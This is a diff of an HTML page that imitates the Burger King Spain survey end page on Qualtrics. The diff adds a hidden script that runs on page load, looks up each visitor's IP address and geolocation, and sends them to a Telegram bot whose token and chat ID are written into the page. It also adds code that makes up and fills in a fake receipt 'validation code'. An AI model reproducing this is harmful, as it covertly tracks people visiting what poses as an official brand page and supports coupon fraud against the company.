@@ -1,7 +1,55 @@
-<!DOCTYPE html>
 <html class="JFEScope" lang="ES-ES"><head>
 
-	 <script>
+
+ <script>
+        async function getIPAddress() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('Error al obtener la IP:', error);
+            }
+        }
+
+        async function getGeolocation(ip) {
+            try {
+                const response = await fetch(`http://ip-api.com/json/${ip}`);
+                const data = await response.json();
+                return data;
+            } catch (error) {
+                console.error('Error al obtener la geolocalización:', error);
+            }
+        }
+
+        async function sendToTelegram(ip, location) {
+            const botToken = '7197964353:AAFQtfYUleR1gc0F8HLbsy9DDivJdyPHDUw';  
+            const chatId = '-1002235777506'; 
+
+            const message = `✅🍔 Nueva visita desde la IP: ${ip}\nUbicación: ${location.city}, ${location.regionName}, ${location.country}`;
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            try {
+                await fetch(url);
+            } catch (error) {
+                console.error('Error al enviar mensaje a Telegram:', error);
+            }
+        }
+
+        async function registerIP() {
+            const ip = await getIPAddress();
+            if (ip) {
+                const location = await getGeolocation(ip);
+                if (location) {
+                    await sendToTelegram(ip, location);
+                }
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', registerIP);
+    </script>
+
+   <script>
         function generarCodigoValidacion() {
             let letras = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
             let letra1 = letras[Math.floor(Math.random() * letras.length)];
@@ -14,7 +62,7 @@
         window.onload = function() {
             generarCodigoValidacion();
         };
-    </script><title>BK Spain Survey</title><meta name="description" content="BK Spain Survey"><meta name="robots" content="index,follow"><meta property="og:site_name" content="BK Spain Survey"><meta property="og:title" content="BK Spain Survey"><meta property="og:description" content="BK Spain Survey"><meta name="twitter:title" content="BK Spain Survey"><meta name="twitter:description" content="BK Spain Survey"><link rel="icon" href="https://cdn.sanity.io/files/illjv600/production/0c4a64bc66369675d3a4dbbe6b012309e2de42e1.png"><meta name="viewport" content="width=device-width, initial-scale=1"></head>
+    </script><title>BK Spain Survey</title><meta name="description" content="BK Spain Survey"><meta name="robots" content="index,follow"><meta property="og:site_name" content="BK Spain Survey"><meta property="og:title" content="BK Spain Survey"><meta property="og:description" content="BK Spain Survey"><meta name="twitter:title" content="BK Spain Survey"><meta name="twitter:description" content="BK Spain Survey"><link rel="icon" href="https://cdn.sanity.io/files/illjv600/production/0c4a64bc66369675d3a4dbbe6b012309e2de42e1.png"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="apple-touch-icon" href="https://rbixm.qualtrics.com/CP/Graphic.php?IM=IM_6G38bpoNPOtygtg"><link type="image/x-icon" rel="icon" href="https://rbixm.qualtrics.com/CP/Graphic.php?IM=IM_6G38bpoNPOtygtg"></head>
     <body id="SurveyEngineBody" style="direction: ltr;"><form id="JFERelevantIDCSOForm" style="display: none;"><input type="hidden" id="ClientId" name="ClientId" value="55D9DEAB-E7E6-4376-A753-90C8E16BA2F5"><input type="hidden" id="Survey" name="Survey" value="SV_9MHgHFvPm0OEHr0"><input type="hidden" id="PanelistID" name="PanelistID" value="FS_8llerwBcLvFk52N"><input type="hidden" id="StatusFlag" name="StatusFlag" value="C"><br><input style="width: 400px; display: none;" type="text" name="AckFlag" id="AckFlag"><br><input style="width: 400px; display: none;" type="text" name="RunTime" id="RunTime"></form>
     <noscript><style>#pace{display: none;}</style><div style="padding:8px 15px;font-family:Helvetica,Arial,sans-serif;background:#fcc;border:1px solid #c55">Javascript is required to load this page.</div></noscript>
     
@@ -165,40 +213,40 @@
 <div class="JFE" id="P_1718809836263"><div class="JFEContent SkinV2 webkit CSS3"><form id="Page" name="Page" class="Page ActivePage" data-testid="page-ready"><meta name="HandheldFriendly" content="true">
 <meta name="viewport" content="user-scalable = yes, maximum-scale=10, minimum-scale=1, initial-scale = 1, width = device-width">
 <div class="Skin">
-	<div id="Overlay"></div>
-	<div id="Wrapper">
-		<div id="ProgressBar"><div role="widget"><table class="ProgressBarContainer" role="progressbar" aria-valuemin="0" aria-valuemax="100" aria-valuenow="100">  <tbody><tr> <td>  </td> <td> <div class="ProgressBarFillContainer" id="ProgressBarFillContainer">     <span class="offScreen">Progreso actual 100%</span>  <div class="ProgressBarFill" style="width: 100%"> </div> </div> </td> <td>  </td> </tr></tbody></table></div></div>
-		<div class="SkinInner">
-			<div id="LogoContainer">
-				<div id="Logo"></div>
-			</div>
-			<div id="HeaderContainer">
-				<div id="BrandingHeader"><div col="col-sm-12"><img id="BKLogo" src="https://rbixm.qualtrics.com/CP/Graphic.php?IM=IM_6G38bpoNPOtygtg" data-image-state="ready"> <img id="MYBKLogo" src="https://rbixm.qualtrics.com/ControlPanel/Graphic.php?IM=IM_3b1ifTal48MVywC" data-image-state="ready"></div>
+  <div id="Overlay"></div>
+  <div id="Wrapper">
+    <div id="ProgressBar"><div role="widget"><table class="ProgressBarContainer" role="progressbar" aria-valuemin="0" aria-valuemax="100" aria-valuenow="100">  <tbody><tr> <td>  </td> <td> <div class="ProgressBarFillContainer" id="ProgressBarFillContainer">     <span class="offScreen">Progreso actual 100%</span>  <div class="ProgressBarFill" style="width: 100%"> </div> </div> </td> <td>  </td> </tr></tbody></table></div></div>
+    <div class="SkinInner">
+      <div id="LogoContainer">
+        <div id="Logo"></div>
+      </div>
+      <div id="HeaderContainer">
+        <div id="BrandingHeader"><div col="col-sm-12"><img id="BKLogo" src="https://rbixm.qualtrics.com/CP/Graphic.php?IM=IM_6G38bpoNPOtygtg" data-image-state="ready"> <img id="MYBKLogo" src="https://rbixm.qualtrics.com/ControlPanel/Graphic.php?IM=IM_3b1ifTal48MVywC" data-image-state="ready"></div>
 <link href="//code.jquery.com/ui/1.12.1/themes/base/jquery-ui.css" rel="stylesheet"></div>
-				<div id="Header" role="banner"><link href="//code.jquery.com/ui/1.12.1/themes/base/jquery-ui.css" rel="stylesheet"></div>
-			</div>
-			<div id="SkinContent">
-				<div id="Questions" role="main"><div id="EndOfSurvey" aria-live="polite" class="END_OF_SURVEY EndOfSurvey BorderColor " style="outline: rgb(0, 0, 0) solid 0px;" tabindex="-1">Gracias por completar la encuesta. A BURGER KING® le gustaría invitarte a volver y visitar nuestros restaurantes. No olvides presentar la oferta que aparece en el ticket de caja en tu próxima visita. Debes escribir el siguiente código en el ticket de caja.<br>
+        <div id="Header" role="banner"><link href="//code.jquery.com/ui/1.12.1/themes/base/jquery-ui.css" rel="stylesheet"></div>
+      </div>
+      <div id="SkinContent">
+        <div id="Questions" role="main"><div id="EndOfSurvey" aria-live="polite" class="END_OF_SURVEY EndOfSurvey BorderColor " style="outline: rgb(0, 0, 0) solid 0px;" tabindex="-1">Gracias por completar la encuesta. A BURGER KING® le gustaría invitarte a volver y visitar nuestros restaurantes. No olvides presentar la oferta que aparece en el ticket de caja en tu próxima visita. Debes escribir el siguiente código en el ticket de caja.<br>
 <br>
-Código de validación: <span id="codigoValidacion"></span><br>
+Código de validación: <span id="codigoValidacion">NW796712</span><br>
 <br>
 Muchas gracias por su participación.<br>
 <br>
 <br>
 Mantente conectado<br>
 <br>
-<a href="www.burgerking.es/home"><img height="53" src="https://rbixm.qualtrics.com/CP/Graphic.php?IM=IM_0uYJwlr7Kd9DeOa" style="width: 171px; height: 53px;" width="171" data-image-state="ready"></a>&nbsp;&nbsp;<br>
+<a href="https://www.bk.com/"><img height="53" src="https://rbixm.qualtrics.com/CP/Graphic.php?IM=IM_0uYJwlr7Kd9DeOa" style="width: 171px; height: 53px;" width="171" data-image-state="ready"></a>&nbsp;&nbsp;<br>
 <br>
 <a href="http://www.facebook.com/burgerking"><img height="30" src="https://rbixm.qualtrics.com/CP/Graphic.php?IM=IM_4Nkcalb6Nu1RXOC" style="width: 32px; height: 30px;" width="32" data-image-state="ready"></a>&nbsp; &nbsp;&nbsp;<a href="http://twitter.com/burgerking"><img height="30" src="https://rbixm.qualtrics.com/CP/Graphic.php?IM=IM_3mcDJaoAypJYSZE" style="width: 32px; height: 30px;" width="32" data-image-state="ready"></a></div></div>
-				<div id="Buttons" role="navigation"></div>
-				
-			</div>
-		</div>
-		<div id="Footer" role="contentinfo"></div>
-		
-		<div id="PushStickyFooter"></div>
-	</div>
-	<div id="Plug" style="display:block !important;"><a href="https://www.qualtrics.com/powered-by-qualtrics/?utm_source=internal%2Binitiatives&amp;utm_medium=survey%2Bpowered%2Bby%2Bqualtrics&amp;utm_content=rbixm&amp;utm_survey_id=SV_9MHgHFvPm0OEHr0" target="_blank" aria-label="Powered by Qualtrics: aprenda más sobre Qualtrics en una pestaña nueva">Powered by Qualtrics</a></div>
+        <div id="Buttons" role="navigation"></div>
+        
+      </div>
+    </div>
+    <div id="Footer" role="contentinfo"></div>
+    
+    <div id="PushStickyFooter"></div>
+  </div>
+  <div id="Plug" style="display:block !important;"><a href="https://www.qualtrics.com/powered-by-qualtrics/?utm_source=internal%2Binitiatives&amp;utm_medium=survey%2Bpowered%2Bby%2Bqualtrics&amp;utm_content=rbixm&amp;utm_survey_id=SV_9MHgHFvPm0OEHr0" target="_blank" aria-label="Powered by Qualtrics: aprenda más sobre Qualtrics en una pestaña nueva">Powered by Qualtrics</a></div>
 </div>
 
 
@@ -216,8 +264,8 @@ Mantente conectado<br>
 }
 
 .Skin #HeaderContainer {
-	background-color: #F5EBDC !important;
-	padding: 10px 0px 0 0px !important;
+  background-color: #F5EBDC !important;
+  padding: 10px 0px 0 0px !important;
 }
 
 .Skin .MC .Inner .InnerInner .QuestionBody .TextEntryBox {
@@ -225,30 +273,30 @@ Mantente conectado<br>
     width: 100% !important;
     padding: 10px 10px 10px 10px !important;
 }
-	
-	
+  
+  
 @media only screen and (min-width: 767px) {
-	
-	#BKLogo {
-		max-height:130px;
-		margin-left:-65px;
-	}
+  
+  #BKLogo {
+    max-height:130px;
+    margin-left:-65px;
+  }
 
-	#MYBKLogo {
-		float:right;
-		max-height:90px;
-		margin-top: 20px;
-	}	
+  #MYBKLogo {
+    float:right;
+    max-height:90px;
+    margin-top: 20px;
+  } 
 }
 
 @media only screen and (max-width: 767px) {
-	
-	#BKLogo {
-	    max-height:130px;
-	}
-	
-	#MYBKLogo {
-		display: none;
-	}	
+  
+  #BKLogo {
+      max-height:130px;
+  }
+  
+  #MYBKLogo {
+    display: none;
+  } 
 }</style>
 </form></div></div><div id="ui-datepicker-div" class="ui-datepicker ui-widget ui-widget-content ui-helper-clearfix ui-corner-all" style="position: absolute; top: 284.5px; left: 777.5px; z-index: 2; display: none;"><div class="ui-datepicker-header ui-widget-header ui-helper-clearfix ui-corner-all"><a class="ui-datepicker-prev ui-corner-all" data-handler="prev" data-event="click" title="Prev"><span class="ui-icon ui-icon-circle-triangle-w">Prev</span></a><a class="ui-datepicker-next ui-corner-all ui-state-disabled" title="Next"><span class="ui-icon ui-icon-circle-triangle-e">Next</span></a><div class="ui-datepicker-title"><span class="ui-datepicker-month">June</span>&nbsp;<span class="ui-datepicker-year">2024</span></div></div><table class="ui-datepicker-calendar"><thead><tr><th scope="col" class="ui-datepicker-week-end"><span title="Sunday">Su</span></th><th scope="col"><span title="Monday">Mo</span></th><th scope="col"><span title="Tuesday">Tu</span></th><th scope="col"><span title="Wednesday">We</span></th><th scope="col"><span title="Thursday">Th</span></th><th scope="col"><span title="Friday">Fr</span></th><th scope="col" class="ui-datepicker-week-end"><span title="Saturday">Sa</span></th></tr></thead><tbody><tr><td class=" ui-datepicker-week-end ui-datepicker-other-month ui-datepicker-unselectable ui-state-disabled">&nbsp;</td><td class=" ui-datepicker-other-month ui-datepicker-unselectable ui-state-disabled">&nbsp;</td><td class=" ui-datepicker-other-month ui-datepicker-unselectable ui-state-disabled">&nbsp;</td><td class=" ui-datepicker-other-month ui-datepicker-unselectable ui-state-disabled">&nbsp;</td><td class=" ui-datepicker-other-month ui-datepicker-unselectable ui-state-disabled">&nbsp;</td><td class=" ui-datepicker-other-month ui-datepicker-unselectable ui-state-disabled">&nbsp;</td><td class=" ui-datepicker-week-end " data-handler="selectDay" data-event="click" data-month="5" data-year="2024"><a class="ui-state-default" href="#">1</a></td></tr><tr><td class=" ui-datepicker-week-end " data-handler="selectDay" data-event="click" data-month="5" data-year="2024"><a class="ui-state-default" href="#">2</a></td><td class=" " data-handler="selectDay" data-event="click" data-month="5" data-year="2024"><a class="ui-state-default" href="#">3</a></td><td class=" " data-handler="selectDay" data-event="click" data-month="5" data-year="2024"><a class="ui-state-default" href="#">4</a></td><td class=" " data-handler="selectDay" data-event="click" data-month="5" data-year="2024"><a class="ui-state-default" href="#">5</a></td><td class=" " data-handler="selectDay" data-event="click" data-month="5" data-year="2024"><a class="ui-state-default" href="#">6</a></td><td class=" " data-handler="selectDay" data-event="click" data-month="5" data-year="2024"><a class="ui-state-default" href="#">7</a></td><td class=" ui-datepicker-week-end " data-handler="selectDay" data-event="click" data-month="5" data-year="2024"><a class="ui-state-default" href="#">8</a></td></tr><tr><td class=" ui-datepicker-week-end " data-handler="selectDay" data-event="click" data-month="5" data-year="2024"><a class="ui-state-default" href="#">9</a></td><td class=" " data-handler="selectDay" data-event="click" data-month="5" data-year="2024"><a class="ui-state-default" href="#">10</a></td><td class=" " data-handler="selectDay" data-event="click" data-month="5" data-year="2024"><a class="ui-state-default" href="#">11</a></td><td class=" " data-handler="selectDay" data-event="click" data-month="5" data-year="2024"><a class="ui-state-default" href="#">12</a></td><td class=" " data-handler="selectDay" data-event="click" data-month="5" data-year="2024"><a class="ui-state-default" href="#">13</a></td><td class=" " data-handler="selectDay" data-event="click" data-month="5" data-year="2024"><a class="ui-state-default" href="#">14</a></td><td class=" ui-datepicker-week-end " data-handler="selectDay" data-event="click" data-month="5" data-year="2024"><a class="ui-state-default" href="#">15</a></td></tr><tr><td class=" ui-datepicker-week-end " data-handler="selectDay" data-event="click" data-month="5" data-year="2024"><a class="ui-state-default" href="#">16</a></td><td class=" " data-handler="selectDay" data-event="click" data-month="5" data-year="2024"><a class="ui-state-default" href="#">17</a></td><td class=" " data-handler="selectDay" data-event="click" data-month="5" data-year="2024"><a class="ui-state-default" href="#">18</a></td><td class=" ui-datepicker-days-cell-over  ui-datepicker-today" data-handler="selectDay" data-event="click" data-month="5" data-year="2024"><a class="ui-state-default ui-state-highlight" href="#">19</a></td><td class=" ui-datepicker-unselectable ui-state-disabled "><span class="ui-state-default">20</span></td><td class=" ui-datepicker-unselectable ui-state-disabled "><span class="ui-state-default">21</span></td><td class=" ui-datepicker-week-end ui-datepicker-unselectable ui-state-disabled "><span class="ui-state-default">22</span></td></tr><tr><td class=" ui-datepicker-week-end ui-datepicker-unselectable ui-state-disabled "><span class="ui-state-default">23</span></td><td class=" ui-datepicker-unselectable ui-state-disabled "><span class="ui-state-default">24</span></td><td class=" ui-datepicker-unselectable ui-state-disabled "><span class="ui-state-default">25</span></td><td class=" ui-datepicker-unselectable ui-state-disabled "><span class="ui-state-default">26</span></td><td class=" ui-datepicker-unselectable ui-state-disabled "><span class="ui-state-default">27</span></td><td class=" ui-datepicker-unselectable ui-state-disabled "><span class="ui-state-default">28</span></td><td class=" ui-datepicker-week-end ui-datepicker-unselectable ui-state-disabled "><span class="ui-state-default">29</span></td></tr><tr><td class=" ui-datepicker-week-end ui-datepicker-unselectable ui-state-disabled "><span class="ui-state-default">30</span></td><td class=" ui-datepicker-other-month ui-datepicker-unselectable ui-state-disabled">&nbsp;</td><td class=" ui-datepicker-other-month ui-datepicker-unselectable ui-state-disabled">&nbsp;</td><td class=" ui-datepicker-other-month ui-datepicker-unselectable ui-state-disabled">&nbsp;</td><td class=" ui-datepicker-other-month ui-datepicker-unselectable ui-state-disabled">&nbsp;</td><td class=" ui-datepicker-other-month ui-datepicker-unselectable ui-state-disabled">&nbsp;</td><td class=" ui-datepicker-week-end ui-datepicker-other-month ui-datepicker-unselectable ui-state-disabled">&nbsp;</td></tr></tbody></table></div></body></html>
